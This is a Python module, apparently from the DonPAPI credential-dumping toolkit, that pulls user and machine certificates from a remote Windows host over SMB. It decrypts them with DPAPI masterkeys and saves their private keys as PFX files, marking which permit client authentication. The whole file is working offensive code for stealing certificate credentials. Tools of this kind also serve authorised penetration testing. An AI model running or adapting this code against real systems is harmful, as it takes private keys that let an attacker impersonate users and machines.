import os
from typing import Any

from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from dploot.triage.certificates import CertificatesTriage
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter

class Certificates:
    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore, false_positive: list, max_filesize: int) -> None:
        self.tag = self.__class__.__name__
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context
        self.false_positive = false_positive
        self.max_filesize = max_filesize

    def run(self):
        self.logger.display(f"Dumping User{' and Machine' if self.context.remoteops_allowed else ''} Certificates")
        certificates_triage = CertificatesTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys)
        certificates = certificates_triage.triage_certificates()
        for certificate in certificates:
            cert_username = certificate.username.rstrip("\x00")
            filename = f"{cert_username}_{certificate.filename[:16]}.pfx"
            filepath = os.path.join(self.context.output_dir,filename)
            with open(filepath, 'wb') as f:
                f.write(certificate.pfx)
            self.logger.secret(f"[{certificate.winuser}] - {cert_username} - {filename}{' - Client auth possible' if certificate.clientauth else ''}", self.tag)
            self.context.db.add_certificate(filepath, certificate, self.context.host)
        if self.context.remoteops_allowed:
            system_certificates = certificates_triage.triage_system_certificates()
            for certificate in system_certificates:
                cert_username = certificate.username.rstrip("\x00")
                filename = f"{cert_username}_{certificate.filename[:16]}.pfx"
                filepath = os.path.join(self.context.output_dir,filename)
                with open(filepath, 'wb') as f:
                    f.write(certificate.pfx)
                self.logger.secret(f"[SYSTEM] - {cert_username} - {filename}{' - Client auth possible' if certificate.clientauth else ''}", self.tag)
                self.context.db.add_certificate(filepath, certificate, self.context.host)